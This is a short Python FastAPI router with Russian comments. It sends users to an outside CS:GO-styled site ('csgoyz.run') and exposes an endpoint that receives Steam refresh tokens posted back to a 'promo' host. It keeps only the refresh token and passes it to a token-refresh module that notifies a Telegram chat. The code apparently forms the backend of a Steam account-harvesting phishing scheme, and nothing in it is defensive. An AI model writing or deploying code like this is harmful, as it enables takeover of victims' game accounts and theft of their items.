from fastapi import APIRouter, Request
from fastapi.responses import RedirectResponse, JSONResponse
import asyncio
import refresh_tokens  # твой модуль

router = APIRouter()

SELF = "https://testi-promo-x6tp.onrender.com"

# 1️⃣ старт авторизации
@router.get("/auth/start")
async def auth_start(chat_id: int):
    redirect = (
        "https://csgoyz.run/?"
        f"tg_callback={SELF}/auth/receive?chat_id={chat_id}"
    )
    return RedirectResponse(redirect)


# 2️⃣ приём токенов
@router.post("/auth/receive")
async def auth_receive(request: Request, chat_id: int):
    data = await request.json()

    refresh = data.get("refresh")  # берём только refresh-token

    if not refresh:
        return JSONResponse({"error": "Refresh token not found"}, status_code=400)

    # Передаём в модуль refresh_tokens.py
    # from_steam=True → уведомление всегда при успехе/неуспехе
    asyncio.create_task(
        refresh_tokens.refresh_by_refresh_token_async(
            chat_id,
            refresh_token=refresh,
            from_steam=True  # важный флаг
        )
    )

    print(f"🔥 Refresh-token передан в модуль: chat_id={chat_id}")

    return JSONResponse({"ok": True})